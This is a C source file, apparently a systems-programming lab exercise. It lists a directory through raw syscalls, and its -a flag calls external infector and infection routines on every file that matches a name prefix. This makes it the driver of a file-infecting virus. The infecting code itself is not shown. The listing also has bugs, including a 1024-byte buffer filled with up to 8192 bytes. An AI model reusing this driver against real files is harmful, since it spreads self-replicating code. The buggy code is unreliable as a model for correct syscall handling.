#include "util.h"
#include <dirent.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
#define BUF_SIZE 1024 

extern void code_start();
extern int system_call();
extern void infector();
extern void infection();
extern void code_end();

int dflag = 0 , pflag = 0 , aflag = 0;  
char *pref;
int fd;

typedef struct dirent0{
    int inode;
    int offset;
    short d_reclen;
    char d_name[1];
} dirent0 ;
enum{
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
};

char* parse_file_type(char d_type) { 
    if(d_type == DT_REG)
        return "regular";
    else if(d_type == DT_DIR)
        return "directory";
    else if(d_type == DT_FIFO)
        return "FIFO";
    else if(d_type == DT_SOCK)
        return "socket";
    else if(d_type == DT_LNK)
        return "symlink";
    else if(d_type == DT_BLK)
        return "block dev";
    else if(d_type == DT_CHR)
        return "char dev";
    else
        return "bla-bla";
}

void detact_flags(int argc , char *argv[]){
    int i = 1;
        for (i = 1; i < argc; i++)
        {
            
            if (strncmp(argv[i] , "-D" , 2) == 0)
            {
                dflag = 1;
            }
            else if (strncmp(argv[i] , "-p", 2)== 0)
            {
                pflag = 1;
                pref = argv[i]+2;
            } 
            else if (strncmp(argv[i] , "-a", 2)== 0)
            {
                aflag = 1;
            }  
        }
}


void parse(int fd , char *buff){
    char *address, *finish;
    int runner = 0;
    int count = 0;
    struct dirent0 *ent;
    count = system_call(SYS_GETDENTS , fd , buff , 8192);
    if (count <= 0)
    {
        system_call(1 , 0x55 , "error-get");
    }
    while(runner < count){
        ent = (struct dirent0 *) (buff + runner); 
        if (pflag == 1)
        {
            if (strncmp(pref , ent->d_name , 1) == 0)
            {
                system_call(SYS_WRITE ,STDOUT , ent->d_name , strlen(ent->d_name));
                system_call(SYS_WRITE , STDOUT , "\n" , 1);
            }
            if (aflag == 1)
            {
                if (strncmp(ent->d_name , pref ,strlen(pref)) == 0)
                {
                    infector(ent->d_name);
                    infection(ent->d_name);
                    address = itoa((int) &code_start);
                    system_call(SYS_WRITE, STDERR, "Start address:", 16);
                    system_call(SYS_WRITE,STDOUT,  address, strlen(address));
                    system_call(SYS_WRITE,STDOUT, "\n", 1);
                    finish = itoa((int)&code_end);
                    system_call(SYS_WRITE, STDERR, "End address:", 14);
                    system_call(SYS_WRITE,STDOUT, finish ,strlen(finish));
                    system_call(SYS_WRITE,STDOUT, "\n", 1);
                }
                
            }
            
            runner = runner + ent->d_reclen;
        }
        else
        {
            system_call(SYS_WRITE ,STDOUT , ent->d_name , strlen(ent->d_name));
            system_call(SYS_WRITE , STDOUT , "\n" , 1);
            runner = runner + ent->d_reclen;
        }
    }
}

int main (int argc , char* argv[], char* envp[]){
    if (argc >1)
    {
        detact_flags(argc , argv);
    }
    char buf[BUF_SIZE];
    fd = system_call(SYS_OPEN , "." , 0 , 0777);
    if (fd <= 0)
    {
        system_call(1 , 0x55 , "error-open");
    }
    parse(fd , buf);
return 0;
}